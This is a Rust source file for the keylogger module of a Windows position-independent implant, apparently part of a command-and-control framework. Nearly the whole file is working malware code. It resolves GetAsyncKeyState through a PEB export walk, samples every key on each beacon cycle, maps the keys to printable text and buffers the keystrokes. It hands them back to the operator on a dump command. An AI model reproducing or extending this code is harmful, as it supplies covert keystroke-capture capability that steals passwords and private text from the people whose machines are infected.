//! Polling keylogger for the Windows PIC implant.
//!
//! ## Honest design note (read this first)
//!
//! A real keylogger installs a hook (`SetWindowsHookExW WH_KEYBOARD_LL`) or an
//! IOCP/raw-input sink that runs on a *background* thread for as long as the
//! implant lives. That is **impossible** in the current PIC implant: the beacon
//! loop ([`crate::beacon::beacon_loop`]) is synchronous-poll and owns the single
//! thread — `sleep → POST → receive tasks → execute → repeat`. There is no std
//! (so no `std::thread`), and the loop never yields control to a persistent
//! task. Building a true hook-based logger would require the persistent-task /
//! IOCP refactor flagged in the design doc.
//!
//! What we do instead is a **pragmatic polling logger**: when active
//! ([`KEYLOG_ACTIVE`]), [`poll_once`] is called by the beacon loop *once per
//! cycle* and samples the keyboard via `GetAsyncKeyState` for all 256 virtual
//! keys. The default sleep is ~5s, so we get roughly one sample per sleep
//! interval — coarse, but it captures any key held down at the sample instant
//! and any key whose *keydown transition* (was-up → now-down) landed in the
//! window since the previous sample. That is honest, functional, and allocation
//! -free in the hot path (only [`do_keylog`] dump allocates).
//!
//! ## Buffer model
//!
//! `BUF` is a fixed 4096-byte array; `BUF_LEN` (AtomicUsize) is both the write
//! head and the live length. [`poll_once`] appends newly-pressed printable keys
//! without allocating. When the buffer is full, new keys are dropped (oldest
//! data preserved) — documented rather than silently wrapped. [`do_keylog`]
//! action=2 copies `[0..len]` into a `Vec`, returns it as `Response::Output`,
//! and resets `len=0`.
//!
//! ## Threading
//!
//! Single-threaded by construction (the beacon loop is the only caller). The
//! atomics exist for static-mut hygiene and to express intent; ordering is
//! `Relaxed`. The `static mut LAST` / `BUF` arrays are touched only inside
//! `unsafe` blocks via raw pointers (`addr_of_mut!`) to avoid the
//! `static_mut_refs` lint under edition 2021.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use nyx_protocol::Response;

// ---- Win32 constants -------------------------------------------------------

/// `GetAsyncKeyState` return: bit 0x8000 set iff the key is currently down at
/// the instant of the call. Compared via the sign bit (the value is i16, so
/// 0x8000 is the sign bit — negative means down).
const KEY_DOWN_BIT: i16 = -0x8000; // 0x8000 sign-extended into an i16.

/// Virtual-key codes we care about (not a full table — only what we map).
const VK_SHIFT: i32 = 0x10; // either Shift; used for case/symbol selection.
const VK_CAPITAL: i32 = 0x14; // CapsLock; its *toggle* state is bit 0x0001.

// ---- Process-wide state ----------------------------------------------------

/// `true` while the keylogger should sample. action=0 sets it, action=1 clears.
static KEYLOG_ACTIVE: AtomicBool = AtomicBool::new(false);

/// Cached `GetAsyncKeyState` export address (0 = unresolved). Resolved lazily on
/// the first active [`poll_once`]; reused thereafter so we don't re-walk
/// user32's export table every cycle.
static GAKS_ADDR: AtomicUsize = AtomicUsize::new(0);

/// `LAST[vk] == 1` means the key was down at the previous sample. Used to detect
/// the keydown *transition* (was up → now down) so a key held across several
/// cycles is recorded once, not on every sample.
// SAFETY: only touched from the beacon loop (single thread) inside unsafe blocks.
static mut LAST: [u8; 256] = [0; 256];

/// Captured-keystroke ring/linear buffer. 4096 bytes (~ a few pages of typing).
// SAFETY: only touched from the beacon loop (single thread) inside unsafe blocks.
static mut BUF: [u8; BUF_CAP] = [0; BUF_CAP];

/// Capacity of [`BUF`] in bytes. A named const (not `BUF.len()`) so we never
/// form a shared reference to the `static mut` just to read its length.
const BUF_CAP: usize = 4096;

/// Live byte count in `BUF` (also the next write index). Atomic only for static
/// hygiene; the single beacon thread is the sole reader/writer.
static BUF_LEN: AtomicUsize = AtomicUsize::new(0);

// ---- helpers ---------------------------------------------------------------

/// Force-load a DLL via the PEB-resolved `LoadLibraryA` (mirrors recon.rs /
/// transport.rs). Idempotent: Windows refcounts module loads, so calling it on
/// every activation is cheap and safe.
fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    // NUL-terminated ASCII name on the stack (dll names here are short).
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    // SAFETY: `name` is a valid NUL-terminated C string on the stack.
    let h = unsafe { load(name.as_ptr()) };
    !h.is_null()
}

/// Resolve & cache `GetAsyncKeyState`. Returns the function pointer, or `None`
/// if user32 could not be loaded or the export was not found. The cached
/// address means the export-table walk happens at most once per process.
fn get_async_key_state_fn() -> Option<unsafe extern "system" fn(i32) -> i16> {
    // Fast path: already resolved this process.
    let cached = GAKS_ADDR.load(Ordering::Relaxed);
    if cached != 0 {
        // SAFETY: we stored a transmuted function pointer; transmute back.
        return Some(unsafe { core::mem::transmute::<usize, _>(cached) });
    }
    // Slow path: force-load user32 (not loaded by default in a PIC implant)
    // and resolve the export via the PEB walk.
    if !force_load(b"user32.dll") {
        return None;
    }
    let addr = unsafe { crate::resolve::export_addr(b"user32.dll", b"GetAsyncKeyState") }?;
    GAKS_ADDR.store(addr, Ordering::Relaxed);
    Some(unsafe { core::mem::transmute::<usize, _>(addr) })
}

/// Map a virtual-key code + shift state to a single printable byte, or `None`
/// if the key isn't one we record (function keys, arrows, modifiers, etc.).
///
/// Letters: lowercase unless Shift is held XOR CapsLock is toggled (XOR matches
/// Win32: CapsLock+Shift = lowercase). Digits: Shift selects the shifted symbol
/// (`1`→`!`, `2`→`@`, …) on the US layout. OEM keys cover the common US punctuation.
/// Layouts other than US will record the wrong glyph for shifted digits/OEM keys
/// — documented as a known limitation of polling without `ToUnicodeEx`.
fn map_vkey(vk: i32, shift: bool) -> Option<u8> {
    // Control/whitespace keys.
    match vk {
        0x08 => return Some(0x08), // Backspace → '\b'
        0x09 => return Some(0x09), // Tab       → '\t'
        0x0D => return Some(b'\n'), // Enter     → '\n'
        0x20 => return Some(b' '), // Space
        0x10 | 0x11 | 0x12 => return None, // Shift/Ctrl/Alt modifiers — not recorded.
        _ => {}
    }
    // Digits '0'..'9' (0x30..0x39); Shift selects the shifted symbol.
    if (0x30..=0x39).contains(&vk) {
        if shift {
            // US layout: )!@#$%^&*(
            const SHIFTED: &[u8; 10] = b")!@#$%^&*(";
            return Some(SHIFTED[(vk - 0x30) as usize]);
        }
        return Some(b'0' + (vk - 0x30) as u8);
    }
    // Letters 'A'..'Z' (0x41..0x5A); vkey is always the uppercase code.
    if (0x41..=0x5A).contains(&vk) {
        let upper = b'A' + (vk - 0x41) as u8;
        return Some(if shift { upper } else { upper + 32 }); // +32 → lowercase ASCII.
    }
    // OEM punctuation (US layout). Shift picks the upper glyph.
    let pair: Option<(u8, u8)> = match vk {
        0xBA => Some((b';', b':')),
        0xBB => Some((b'=', b'+')),
        0xBC => Some((b',', b'<')),
        0xBD => Some((b'-', b'_')),
        0xBE => Some((b'.', b'>')),
        0xBF => Some((b'/', b'?')),
        0xC0 => Some((b'`', b'~')),
        0xDB => Some((b'[', b'{')),
        0xDC => Some((b'\\', b'|')),
        0xDD => Some((b']', b'}')),
        0xDE => Some((b'\'', b'"')),
        _ => None,
    };
    pair.map(|(lo, hi)| if shift { hi } else { lo })
}

/// Append one byte to `BUF` without allocating. Drops the byte if the buffer is
/// already full (oldest data preserved; documented behavior).
fn buf_push(b: u8) {
    let len = BUF_LEN.load(Ordering::Relaxed);
    if len >= BUF_CAP {
        return; // full — drop newest. See module docs.
    }
    // SAFETY: single-threaded; len < BUF.len() so the index is in bounds. We
    // write through a raw pointer obtained via addr_of_mut! to avoid forming a
    // `&mut` to a `static mut` (static_mut_refs lint under edition 2021).
    unsafe {
        let ptr: *mut u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
        *ptr.add(len) = b;
    }
    BUF_LEN.store(len + 1, Ordering::Relaxed);
}

// ---- public API ------------------------------------------------------------

/// Sample the keyboard once. Called by the beacon loop every cycle; it is a
/// no-op when the keylogger is inactive, so callers can invoke it
/// unconditionally each cycle. When active, it scans all 256 virtual keys,
/// appends each newly-pressed (keydown-transition) printable key to `BUF`, and
/// updates `LAST[vk]` so the transition fires only once per press.
///
/// Never allocates and never panics. Export-resolution failures (user32 not
/// loadable) are swallowed: the cycle is simply a no-op for capture.
pub fn poll_once() {
    if !KEYLOG_ACTIVE.load(Ordering::Relaxed) {
        return;
    }
    let gaks = match get_async_key_state_fn() {
        Some(f) => f,
        None => return, // user32 unavailable this cycle; try again next time.
    };

    // Determine Shift / CapsLock once for this whole scan.
    // SAFETY: gaks is a valid GetAsyncKeyState pointer.
    let shift = (unsafe { gaks(VK_SHIFT) } & KEY_DOWN_BIT) == KEY_DOWN_BIT;
    // CapsLock is a *toggle*: its persisted on/off state is the low bit (0x0001).
    let caps = (unsafe { gaks(VK_CAPITAL) } & 1) != 0;
    // Letters are uppercase iff Shift XOR CapsLock.
    let upper_for_letters = shift ^ caps;

    // Raw pointer to LAST so we never form a shared/mut ref to the static.
    // SAFETY: only the beacon thread touches LAST.
    let last_ptr: *mut u8 = unsafe { core::ptr::addr_of_mut!(LAST).cast::<u8>() };

    for vk in 0i32..256 {
        // SAFETY: gaks is a valid GetAsyncKeyState pointer.
        let state = unsafe { gaks(vk) };
        // High bit (0x8000) set => key currently down.
        let down = (state & KEY_DOWN_BIT) == KEY_DOWN_BIT;
        // SAFETY: vk is 0..256, in bounds for the 256-entry array.
        let was = unsafe { *last_ptr.add(vk as usize) };
        unsafe {
            *last_ptr.add(vk as usize) = if down { 1 } else { 0 };
        }

        // Record only on a fresh keydown transition (was up, now down) so a key
        // held across several sleep cycles is captured once, not per sample.
        if down && was == 0 {
            // Use the letter-case rule (Shift XOR Caps) for A-Z, else plain shift.
            let shift_for_this = if (0x41..=0x5A).contains(&vk) {
                upper_for_letters
            } else {
                shift
            };
            if let Some(b) = map_vkey(vk, shift_for_this) {
                buf_push(b);
            }
        }
    }
}

/// Handle `Command::Keylog { action }`: `0`=start, `1`=stop, `2`=dump.
///
/// - start/stop just flip [`KEYLOG_ACTIVE`]; both return `Response::Ok`.
///   Starting does not pre-clear the buffer (a re-start after a dump continues
///   capturing into whatever space remains) and stopping does not discard
///   captured data (use dump to retrieve it).
/// - dump copies the buffered bytes into a `Vec`, returns them as
///   `Response::Output`, and resets the buffer length to 0 (clearing it for the
///   next capture window). An empty buffer yields an empty `Output`, not an
///   error.
pub fn do_keylog(action: u8) -> Response {
    match action {
        0 => {
            KEYLOG_ACTIVE.store(true, Ordering::Relaxed);
            Response::Ok
        }
        1 => {
            KEYLOG_ACTIVE.store(false, Ordering::Relaxed);
            Response::Ok
        }
        2 => {
            // Snapshot length, copy [0..len] into a Vec, then reset. Only this
            // path allocates; poll_once stays allocation-free.
            let len = BUF_LEN.load(Ordering::Relaxed);
            let mut out: Vec<u8> = Vec::with_capacity(len);
            // SAFETY: single-threaded; len <= BUF.len(). Read through a raw
            // pointer to avoid forming a `&static mut` (static_mut_refs lint).
            unsafe {
                let ptr: *const u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
                for i in 0..len {
                    out.push(*ptr.add(i));
                }
            }
            BUF_LEN.store(0, Ordering::Relaxed); // clear for the next window.
            Response::Output(out)
        }
        // Unknown action tag — protocol-valid u8 but not 0/1/2. Surface as Err
        // (matches recon.rs error style) rather than panicking.
        other => Response::Err({
            let mut e = String::new();
            e.push_str("keylog: unknown action ");
            // Decimal-encode the byte without format! (no_std).
            let mut buf = [0u8; 3];
            let mut n = 0usize;
            let mut v = other as u32;
            if v == 0 {
                buf[0] = b'0';
                n = 1;
            } else {
                while v != 0 {
                    n += 1;
                    buf[buf.len() - n] = b'0' + (v % 10) as u8;
                    v /= 10;
                }
            }
            e.push_str(core::str::from_utf8(&buf[buf.len() - n..]).unwrap_or("?"));
            e
        }),
    }
}
